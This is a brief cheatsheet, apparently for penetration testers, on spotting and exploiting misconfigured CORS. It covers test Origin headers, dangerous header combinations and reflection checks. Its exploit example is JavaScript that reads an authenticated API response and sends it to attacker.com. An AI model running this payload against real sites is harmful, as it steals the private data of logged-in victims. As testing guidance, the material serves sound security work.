# 🌐 CORS Cheatsheet

> Testing misconfigured Cross-Origin Resource Sharing

---

## 🎯 Core Concept

CORS misconfig = browser allows attacker origin to read sensitive data

---

## 🔍 Test Header

```http
Origin: https://evil.com
```

---

## 🚨 Dangerous Configs

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

## ⚡ Reflection Test

```http
Origin: https://attacker.com
```

👉 If reflected → vulnerable

---

## 💣 Exploit Example

```javascript
fetch("https://target.com/api", {
  credentials: "include"
})
.then(res => res.text())
.then(data => fetch("https://attacker.com?data="+data))
```

---

## 🧠 Key Checks

* ACAO header value
* Credentials allowed?
* Origin reflected?

---

## ⚠️ Important

CORS exploit requires:
✔️ Victim logged in
✔️ Browser context
